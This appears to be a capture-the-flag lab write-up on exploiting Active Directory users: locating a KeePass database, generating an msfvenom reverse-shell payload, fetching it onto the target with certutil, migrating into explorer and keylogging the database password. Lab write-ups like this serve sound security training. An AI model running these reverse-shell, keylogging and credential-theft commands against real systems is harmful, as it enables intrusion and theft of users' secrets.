# Exploiting AD Users

### <mark style="color:green;">Users and User Behaviour</mark> <a href="#users-and-user-behaviour" id="users-and-user-behaviour"></a>

Users are, unfortunately, often the weakest link in the security chain. Just think about weak passwords and bad habits, such as granting overly permissive permissions.

* Credential Management - How users store their credentials.
* Keylogging - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, Keylogging can be a useful tool to gain this understanding from an attacker's perspective.

***

### <mark style="color:green;">Hunting for Credentials</mark>

Now that we have compromised THMSERVER1, we should probably look around to see if there is any useful information. Have a look at the user directories and see if there is some useful information in any of them.

Your enumeration efforts should lead you to a .kdbx file. A quick Google should confirm our suspicion that this file is indeed very valuable! We can use Meterpreter's download command to recover this file.

Last time we dumped the SAM hash of THMSERVER1, so we can just login to any of them and look for the .kdbx file

<figure><img src="../../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

Logging into ServerAdmin and using this regex:

```powershell
Get-ChildItem -Path "C:\Users" -include "*.kdbx" -Recurse
```

<figure><img src="../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">SYSTEM is Sometimes Too Privileged</mark> <a href="#system-is-sometimes-too-privileged" id="system-is-sometimes-too-privileged"></a>

When we get our shell. It will be running as SYSTEM. Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should be able to migrate to any process.

Apparently there is only one correct DB which is `trevor.local`'s. Now we use msfvenom to generate the keylogger and send it

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.11.98 LPORT="1234" -f psh -o shell.ps1
```

<figure><img src="../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Setup listener

```bash
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.11.98; set LPORT '1234'; exploit"
```

<figure><img src="../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

Host python server and download it on target machine

```powershell
certutil.exe -urlcache -split -f http://10.50.11.98:8000/shell.ps1
```

<figure><img src="../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

Execute the keylogger

<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

After getting callback, find 'explorer' process

<figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

Migrate the process to run meterpreter as user's process

<figure><img src="../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Start keyscan sniffer

```bash
meterpreter > keyscan_start
```

After a few minutes dump the keystrokes and we get the password for the DB file

```bash
meterpreter > keyscan_dump
```

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

Download the DB file

```
meterpreter > download PasswordDatabase.kdbx
```

Open keepass on attacker machine

```bash
keepasxc
```

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

Unlock using password that was keylogged

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

We can see there is a user and his password that may be useful later. We also find the flag

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

***



